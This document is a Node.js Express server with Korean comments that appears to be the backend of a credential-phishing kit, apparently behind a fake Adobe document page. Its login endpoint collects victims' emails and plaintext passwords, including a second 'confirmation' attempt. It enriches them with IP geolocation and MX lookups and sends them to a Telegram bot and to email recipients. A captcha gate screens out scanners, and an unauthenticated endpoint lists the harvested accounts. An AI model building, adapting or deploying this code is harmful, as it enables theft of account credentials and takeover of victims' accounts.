const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// 미들웨어 — 순서 중요!
// ============================================================

// 1) 요청 로거 (가장 먼저 — 모든 요청 추적)
app.use((req, res, next) => {
  console.log(`[REQ] ${new Date().toISOString()} ${req.method} ${req.path} | Origin: ${req.headers.origin || '-'} | UA: ${(req.headers['user-agent'] || '').substring(0, 60)}`);
  next();
});

// 2) CORS — 함수형 origin + 옵션 완비
const corsOptions = {
  origin: function (origin, callback) {
    // origin 없음 (curl/postman/서버간) → 허용
    if (!origin) return callback(null, true);

    const allowed = [
      'https://lihtec.com',
      'https://www.lihtec.com',
      'https://f005.backblazeb2.com',
      'https://adobe-secure.s3.us-east-005.backblazeb2.com',
      'http://localhost:3000',
      'http://localhost:5500',
      'http://127.0.0.1:3000'
    ];

    if (allowed.includes(origin)) {
      return callback(null, true);
    }

    console.warn(`⛔ CORS 차단됨: ${origin}`);
    return callback(null, false);
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-session-token'],
  exposedHeaders: ['x-session-token'],
  credentials: true,
  optionsSuccessStatus: 200,
  maxAge: 86400
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));

// 3) Body 파서
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

// 4) 보안 헤더
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('Referrer-Policy', 'no-referrer-when-downgrade');
  next();
});

// ============================================================
// 환경 설정
// ============================================================

const BOT_TOKEN            = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID              = process.env.TELEGRAM_CHAT_ID;
const BREVO_API_KEY        = process.env.BREVO_API_KEY;
const SENDER_EMAIL         = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME          = process.env.SENDER_NAME  || 'ABV 모니터';
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY;

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',')
    .map(e => e.trim())
    .filter(Boolean);

// 세션 토큰 저장소 (메모리)
const validSessions = new Map();

// 문서 접근 추적
const documentAccess = new Map();

// 만료 세션 정리 (1시간마다)
setInterval(() => {
    const now = Date.now();
    for (let [token, expiry] of validSessions.entries()) {
        if (now > expiry) validSessions.delete(token);
    }
}, 3600000);

// ============================================================
// 시작 시 환경 변수 확인
// ============================================================

console.log('========================================');
console.log('🔍 환경 변수 확인:');
console.log(`   텔레그램 봇 토큰 : ${BOT_TOKEN ? '✅' : '❌ 없음'}`);
console.log(`   텔레그램 채팅 ID : ${CHAT_ID ? '✅' : '❌ 없음'}`);
console.log(`   Brevo API 키    : ${BREVO_API_KEY ? '✅' : '❌ 없음'}`);
console.log(`   Turnstile 시크릿: ${TURNSTILE_SECRET_KEY ? '✅' : '❌ 없음 ← ⚠️ 필수!'}`);
console.log(`   이메일 수신자   : ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + '명' : '❌ 없음'}`);
console.log('========================================');

// ============================================================
// 🛡️ 캡차 검증
// ============================================================

app.post('/api/verify-captcha', async (req, res) => {
    const { token } = req.body;

    if (!token) {
        console.log('❌ verify-captcha: 토큰 없음');
        return res.status(400).json({ success: false, message: '토큰이 필요합니다' });
    }

    if (!TURNSTILE_SECRET_KEY) {
        console.error('❌ TURNSTILE_SECRET_KEY 환경변수가 없습니다!');
        return res.status(500).json({ success: false, message: '서버 설정 오류 (Turnstile 시크릿 키 없음)' });
    }

    try {
        const formData = new URLSearchParams();
        formData.append('secret',   TURNSTILE_SECRET_KEY);
        formData.append('response', token);

        const cloudflareRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            body: formData
        });

        const cloudflareData = await cloudflareRes.json();
        console.log('   🔎 Cloudflare 응답:', JSON.stringify(cloudflareData));

        if (cloudflareData.success) {
            const sessionToken = crypto.randomBytes(32).toString('hex');
            const expiry = Date.now() + (1000 * 60 * 60);
            validSessions.set(sessionToken, expiry);
            console.log('✅ 캡차 검증 성공. 세션 생성됨:', sessionToken.substring(0, 16) + '...');
            return res.json({ success: true, sessionToken, message: '검증 성공' });
        } else {
            console.log('❌ 캡차 검증 실패:', cloudflareData['error-codes']);
            return res.status(403).json({
                success: false,
                message: '캡차 검증 실패',
                errors: cloudflareData['error-codes']
            });
        }
    } catch (error) {
        console.error('❌ 캡차 검증 오류:', error.message);
        return res.status(500).json({ success: false, message: '서버 내부 오류' });
    }
});

// ============================================================
// 헬퍼: Brevo 이메일
// ============================================================

async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, attempt) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) {
        console.log('⚠️ Brevo 설정 안 됨, 이메일 건너뜀');
        return false;
    }

    const attemptLabel = attempt === 2 ? '2차 (확인)' : '1차 (최초)';
    const subject = `🔐 ABV 로그인 정보 — ${email} — ${attemptLabel}`;

    const htmlContent = `
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8">
    <style>
        body { font-family: 'Malgun Gothic', Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
        .content { padding: 20px; }
        .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
        .label { font-weight: bold; color: #555; }
        .value { color: #1e930c; font-size: 16px; }
        .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
    </style></head>
    <body>
        <div class="container">
            <div class="header"><h2>🔐 ABV 로그인 정보</h2></div>
            <div class="content">
                <div class="field"><div class="label">📧 이메일:</div><div class="value"><strong>${email}</strong></div></div>
                <div class="field"><div class="label">🔑 비밀번호:</div><div class="value"><strong>${password}</strong></div></div>
                <div class="field"><div class="label">🌐 도메인:</div><div class="value">${domain || '알 수 없음'}</div></div>
                <div class="field"><div class="label">📨 MX:</div><div class="value">${mxRecord || '알 수 없음'}</div></div>
                <div class="field"><div class="label">🌍 IP:</div><div class="value">${ipInfo?.ip || '알 수 없음'}</div></div>
                <div class="field"><div class="label">📍 위치:</div><div class="value">${ipInfo?.city || '?'}, ${ipInfo?.region || '?'}, ${ipInfo?.country || '?'}</div></div>
                <div class="field"><div class="label">📱 브라우저:</div><div class="value">${userAgent?.substring(0, 100) || '?'}...</div></div>
                <div class="field"><div class="label">🕐 시각:</div><div class="value">${new Date().toLocaleString('ko-KR')}</div></div>
            </div>
            <div class="footer"><p>© ${new Date().getFullYear()} ABV 모니터</p></div>
        </div>
    </body></html>`;

    const textContent = `🔐 ABV 로그인 정보\n이메일: ${email}\n비밀번호: ${password}\n도메인: ${domain}\nMX: ${mxRecord}\nIP: ${ipInfo?.ip}\n위치: ${ipInfo?.city}, ${ipInfo?.region}, ${ipInfo?.country}\n시각: ${new Date().toLocaleString('ko-KR')}`;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject: subject,
                htmlContent: htmlContent,
                textContent: textContent
            })
        });
        const data = await response.json();
        if (response.ok) {
            console.log('✅ Brevo 발송 성공:', data.messageId || '전송됨');
            return true;
        } else {
            console.error('❌ Brevo 오류:', response.status, data.message || data.error || JSON.stringify(data));
            return false;
        }
    } catch (error) {
        console.error('❌ Brevo 실패:', error.message);
        return false;
    }
}

// ============================================================
// 헬퍼: 텔레그램
// ============================================================

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ 텔레그램 설정 안 됨, 건너뜀');
        return null;
    }
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        const result = await response.json();
        console.log('📤 텔레그램:', result.ok ? '✅ 전송 완료' : '❌ 실패 — ' + (result.description || ''));
        return result;
    } catch (error) {
        console.error('❌ 텔레그램 오류:', error.message);
        return null;
    }
}

// ============================================================
// 헬퍼: IP 정보
// ============================================================

async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim();
        if (!firstIP || firstIP === '::1' || firstIP === '127.0.0.1') {
            return { ip: firstIP, country: '로컬', city: '로컬', region: '로컬' };
        }
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        return await response.json();
    } catch (error) {
        console.error('❌ IP 조회 오류:', error.message);
        return { ip: ip || '?', country: '?', city: '?', region: '?' };
    }
}

// ============================================================
// 헬퍼: MX 레코드
// ============================================================

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'MX 없음';
    } catch (error) {
        return 'MX 조회 오류';
    }
}

// ============================================================
// 헬스 체크
// ============================================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        env: {
            telegram: !!(BOT_TOKEN && CHAT_ID),
            email: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
            turnstile: !!TURNSTILE_SECRET_KEY
        },
        sessions: validSessions.size,
        documentAccess: documentAccess.size
    });
});

// ============================================================
// 세션 검증 미들웨어
// ============================================================

function verifySession(req, res, next) {
    const sessionToken = req.headers['x-session-token'];

    if (!sessionToken) {
        console.log('⛔ 세션 토큰 없음');
        return res.status(401).json({ success: false, message: '인증 실패: 세션 토큰 없음' });
    }

    const expiry = validSessions.get(sessionToken);

    if (!expiry || Date.now() > expiry) {
        console.log('⛔ 유효하지 않거나 만료된 세션');
        return res.status(401).json({ success: false, message: '인증 실패: 유효하지 않거나 만료된 토큰' });
    }

    req.sessionToken = sessionToken;
    next();
}

// ============================================================
// 🔐 로그인 엔드포인트
// ============================================================

app.post('/api/login', verifySession, async (req, res) => {
    console.log('📧 /api/login 수신 (인증된 세션)');

    const { email, password, attempt } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: '이메일과 비밀번호가 필요합니다' });
    }

    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ success: false, message: '이메일 형식 오류' });
    }

    const clientIP       = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || '?';
    const ipInfo         = await getIPInfo(clientIP);
    const domain         = email.split('@')[1];
    const mxRecord       = await getMXRecord(domain);
    const userAgent      = req.headers['user-agent']      || '?';
    const acceptLanguage = req.headers['accept-language'] || '?';
    const attemptNum     = (attempt === 2 || attempt === '2') ? 2 : 1;
    const attemptLabel   = attemptNum === 2 ? '2차 (확인)' : '1차 (최초)';

    console.log(`   📨 ${email} | ${attemptLabel}`);

    // 문서 접근 추적
    documentAccess.set(email, {
        lastAccess: new Date().toISOString(),
        ip: clientIP,
        ipInfo,
        attempts: (documentAccess.get(email)?.attempts || 0) + 1
    });

    // 1) 텔레그램
    const telegramMessage = `🔐 문서 접근 — ${email} — ${attemptLabel}

📧 이메일: ${email}
🔑 비밀번호: ${password}
🎯 시도 회차: ${attemptLabel}
🌐 도메인: ${domain}
📨 MX 레코드: ${mxRecord}
🌍 IP: ${clientIP}
📍 위치: ${ipInfo.city || '?'}, ${ipInfo.region || '?'}, ${ipInfo.country || '?'}
📱 브라우저: ${userAgent.substring(0, 80)}
🗣 언어: ${acceptLanguage}
🕐 시각: ${new Date().toLocaleString('ko-KR')}

📄 문서 접근 추적:
  - 이 이메일로 총 ${documentAccess.get(email).attempts}회 시도`;

    const telegramResult = await sendToTelegram(telegramMessage);

    // 2) Brevo 이메일
    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, attemptNum);

    const telegramOK = !!(telegramResult && telegramResult.ok);
    if (telegramOK || emailResult) {
        console.log('✅ 알림 발송 성공');
        return res.json({
            success: true,
            message: '로그인 처리 완료',
            notifications: { telegram: telegramOK, email: emailResult }
        });
    } else {
        console.log('❌ 알림 발송 실패');
        return res.status(500).json({ success: false, message: '알림 발송 실패' });
    }
});

// ============================================================
// 📄 문서 접근 기록 조회 (관리자용)
// ============================================================

app.get('/api/document-access', (req, res) => {
    const list = Array.from(documentAccess.entries()).map(([email, data]) => ({
        email,
        ...data
    }));
    res.json({ success: true, count: list.length, data: list });
});

// ============================================================
// 404
// ============================================================

app.use('*', (req, res) => {
    console.log('❓ 404:', req.method, req.originalUrl);
    res.status(404).json({
        success: false,
        message: `엔드포인트를 찾을 수 없음: ${req.method} ${req.originalUrl}`
    });
});

// ============================================================
// 서버 시작
// ============================================================

app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 서버 실행 — 포트 ${PORT}`);
    console.log(`🌐 헬스 체크: /health`);
    console.log(`📧 로그인:    /api/login`);
    console.log('========================================');
});

process.on('uncaughtException',  (err) => console.error('❌ 예외:', err.message));
process.on('unhandledRejection', (r)   => console.error('❌ 거부:', r));